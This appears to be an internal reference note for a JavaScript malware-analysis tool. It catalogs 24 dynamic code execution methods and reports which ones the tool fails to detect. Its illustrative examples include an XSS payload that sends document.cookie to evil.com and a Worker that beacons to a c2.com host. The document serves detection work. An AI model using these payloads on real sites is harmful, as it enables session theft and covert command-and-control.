# JavaScript Dynamic Code Execution - Quick Reference

## TL;DR: Yes, there are MANY methods beyond eval()

js_unshroud currently only detects the **effects** of code execution (console logs, network requests) but is **blind to the execution itself** for most methods.

---

## The Big Picture: 24 Different Execution Methods

### ✅ What js_unshroud SEES:
- Console output from executed code
- Network requests made by executed code
- Errors thrown by executed code

### ❌ What js_unshroud MISSES:
- The execution itself (no event logged)
- The code being executed
- The method used to execute

---

## Quick Reference: Execution Methods by Category

### 🔴 CRITICAL - Not Instrumented (Most Common)

| Method | Example | Malware Usage |
|--------|---------|---------------|
| `eval()` | `eval('alert(1)')` | ⭐⭐⭐⭐⭐ Very Common |
| `window.eval` | `window.eval('alert(1)')` | ⭐⭐⭐⭐⭐ Very Common |
| `Function()` | `new Function('alert(1)')()` | ⭐⭐⭐⭐⭐ Very Common |
| `setTimeout(string)` | `setTimeout('alert(1)', 0)` | ⭐⭐⭐⭐ Common |
| `setInterval(string)` | `setInterval('alert(1)', 1000)` | ⭐⭐⭐ Common |

**Impact:** These 5 methods account for ~90% of malware deobfuscation.

---

### 🟠 HIGH - Partially Instrumented (Script Injection)

| Method | Example | Current Status |
|--------|---------|----------------|
| `innerHTML` with `<script>` | `div.innerHTML = '<script>evil()</script>'` | ⚠️ Logs operation but NOT content |
| `outerHTML` with `<script>` | `div.outerHTML = '<script>evil()</script>'` | ⚠️ Not specifically tracked |
| `createElement('script')` | `script.src = 'evil.js'; body.appendChild(script)` | ⚠️ appendChild logged, script details NOT |
| `script.textContent` | `script.textContent = 'evil()'; body.appendChild(script)` | ⚠️ NOT tracked |
| Event handlers in HTML | `img.innerHTML = '<img onerror="evil()">'` | ❌ NOT detected |

**Impact:** Very common in DOM-based attacks and malware loaders.

---

### 🟡 MEDIUM - Not Instrumented (Alternative Methods)

| Method | Example | Malware Usage |
|--------|---------|---------------|
| `insertAdjacentHTML()` | `el.insertAdjacentHTML('beforeend', '<script>')` | ⭐⭐⭐ Common |
| `document.write()` | `document.write('<script>evil()</script>')` | ⭐⭐⭐ Common (older) |
| `setAttribute('onclick')` | `el.setAttribute('onclick', 'evil()')` | ⭐⭐⭐ Common |
| `element.onclick = ...` | `el.onclick = function() { evil() }` | ⭐⭐ Common |
| `javascript:` URLs | `location.href = 'javascript:alert(1)'` | ⭐⭐ Less common |
| `data:` URLs | `script.src = 'data:text/javascript,alert(1)'` | ⭐⭐⭐ Common |
| `blob:` URLs | `script.src = URL.createObjectURL(blob)` | ⭐⭐ Advanced |
| Web Workers | `new Worker(blobUrl)` | ⭐⭐ Advanced |

---

### 🟢 LOW - Not Instrumented (Modern/Exotic)

| Method | Example | Malware Usage |
|--------|---------|---------------|
| `import()` | `import('data:text/javascript,...')` | ⭐ Rare (increasing) |
| `iframe.srcdoc` | `iframe.srcdoc = '<script>evil()</script>'` | ⭐ Rare |
| `iframe.contentWindow.eval` | `iframe.contentWindow.eval('evil()')` | ⭐ Rare |
| `Reflect.construct(Function)` | `Reflect.construct(Function, ['evil()'])()` | ⭐ Very rare |
| WebAssembly | `wasm.exports.malicious()` | ⭐ Very rare |

---

## Test Results: 22 Execution Methods Tested

### Console Output Visibility ✅ (Indirect Detection)

All 22 methods **produced console output** that was captured:
- ✓ eval executed
- ✓ window.eval executed
- ✓ Function constructor executed
- ✓ setTimeout string executed
- ✓ script.textContent executed
- ✓ innerHTML script executed
- ✓ onerror handler executed
- ✓ onclick executed
- ✓ data: URL executed
- ✓ Blob URL executed
- ✓ Worker executed
- ✓ iframe srcdoc executed
- ... etc

**BUT:** Console output only appears if malware chooses to log. Sophisticated malware won't.

---

### Direct Execution Detection ❌ (What We Actually Need)

**Events logged for execution methods:** 0

Expected events that should have been logged:
```json
// For eval('console.log("test")')
{
  "type": "code_execution",
  "method": "eval",
  "code": "console.log(\"test\")",
  "timestamp": 1234567890
}

// For innerHTML = '<script>evil()</script>'
{
  "type": "script_injection",
  "method": "innerHTML",
  "content": "<script>evil()</script>",
  "containsScript": true,
  "timestamp": 1234567890
}

// For new Function('code')
{
  "type": "code_execution",
  "method": "Function",
  "arguments": ["code"],
  "timestamp": 1234567890
}
```

**Actual events logged:** None (0)

---

### DOM Events Bug 🐛

**Expected:** DOM operations (appendChild, innerHTML) should log events
**Actual:** No DOM events in output despite "DOM hooks loaded" message
**Status:** Bug - DOM hooks load but don't produce events

This is a **separate issue** from the missing code execution hooks.

---

## Real-World Malware Examples

### Example 1: Multi-Stage Loader (MISSED)
```javascript
// Stage 1: Base64 decode
const stage1 = atob('ZnVuY3Rpb24gbG9hZCgpe...');  // ❌ atob NOT tracked

// Stage 2: eval
eval(stage1);  // ❌ eval NOT tracked

// Stage 3: Function constructor
new Function(stage2)();  // ❌ Function NOT tracked

// Stage 4: Dynamic script injection
const s = document.createElement('script');
s.textContent = stage3;  // ⚠️ textContent NOT tracked
document.body.appendChild(s);  // ⚠️ appendChild tracked but script details NOT

// What js_unshroud sees: Only the final network request or console output
```

---

### Example 2: DOM-Based XSS (PARTIALLY MISSED)
```javascript
// Attacker injects:
element.innerHTML = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';

// What js_unshroud sees:
// ⚠️ innerHTML operation logged (length only, not content)
// ❌ onerror handler NOT logged
// ✅ fetch() to evil.com logged (but too late - cookie already stolen)
```

---

### Example 3: Worker-Based C2 (COMPLETELY MISSED)
```javascript
// Malware creates hidden worker:
const code = 'setInterval(() => fetch("https://c2.com/beacon"), 5000)';
const blob = new Blob([code], {type: 'text/javascript'});
const worker = new Worker(URL.createObjectURL(blob));

// What js_unshroud sees:
// ❌ Blob creation NOT tracked
// ❌ Worker creation NOT tracked
// ❌ Worker code NOT captured
// ⚠️ fetch() from worker context may not be captured (different realm)
```

---

## Critical Gaps Summary

| Category | Methods Exist | Instrumented | Coverage |
|----------|---------------|--------------|----------|
| Direct execution (eval, Function) | 5 | 0 | 0% |
| Script injection (innerHTML, createElement) | 6 | 0 | 0% |
| Event handlers (onclick, setAttribute) | 4 | 0 | 0% |
| URL-based (javascript:, data:, blob:) | 5 | 0 | 0% |
| Workers (Worker, SharedWorker) | 2 | 0 | 0% |
| Modern (import, modules) | 2 | 0 | 0% |
| **TOTAL** | **24** | **0** | **0%** |

**Service Workers:** ✅ Well instrumented (good job!)

---

## Priority Recommendations

### P0 - Must Have (Week 1)
1. **eval() instrumentation** - Direct, indirect, aliased
2. **Function() constructor** - All variants
3. **Fix setTimeout/setInterval string bug** - Should work but doesn't
4. **Fix DOM hooks bug** - Load but don't log events

### P1 - Should Have (Week 2-3)
5. **innerHTML/outerHTML content logging** - Capture full HTML, detect `<script>` tags
6. **script element tracking** - Log src/textContent for createElement('script')
7. **insertAdjacentHTML()** - Hook and analyze content
8. **document.write/writeln()** - Hook and analyze content

### P2 - Nice to Have (Week 4+)
9. **Event handler detection** - setAttribute, onclick property, etc.
10. **Blob URL tracking** - Blob creation + URL.createObjectURL
11. **Worker instrumentation** - Worker/SharedWorker with code extraction
12. **data: URL analysis** - Detect and decode base64 data: URLs

---

## Testing Coverage

**Created test files:**
- `tests/fixtures/obfuscation-test.html` - 20 obfuscation techniques
- `tests/fixtures/dynamic-execution-test.html` - 22 execution methods

**Results:**
- Encoding/decoding operations: 0% instrumented
- Code execution methods: 0% instrumented
- Console output capture: 100% working
- Network capture: 100% working
- DOM operations: 0% working (bug)
- Timer operations: 0% working (bug)

---

## Bottom Line

**Question:** Are there methods other than eval to execute deobfuscated JavaScript?

**Answer:** Yes, at least **24 different methods**, grouped into 6 categories.

**Current State:** js_unshroud instruments **0 of 24 methods** (0%).

**What This Means:**
- ✅ Can see behavior of malware after it executes (network, console, errors)
- ❌ Cannot see HOW malware deobfuscates and executes
- ❌ Cannot capture intermediate payloads
- ❌ Cannot build deobfuscation timeline
- ❌ Blind to sophisticated malware that doesn't log to console

**To Fix:** Implement code execution hooks as outlined in `DYNAMIC_CODE_EXECUTION_METHODS.md`

---

## See Also

- `OBFUSCATION_EVALUATION.md` - Full evaluation report on obfuscation detection
- `DYNAMIC_CODE_EXECUTION_METHODS.md` - Detailed technical breakdown of all 24 methods
- `tests/fixtures/obfuscation-test.html` - Test harness for obfuscation techniques
- `tests/fixtures/dynamic-execution-test.html` - Test harness for execution methods
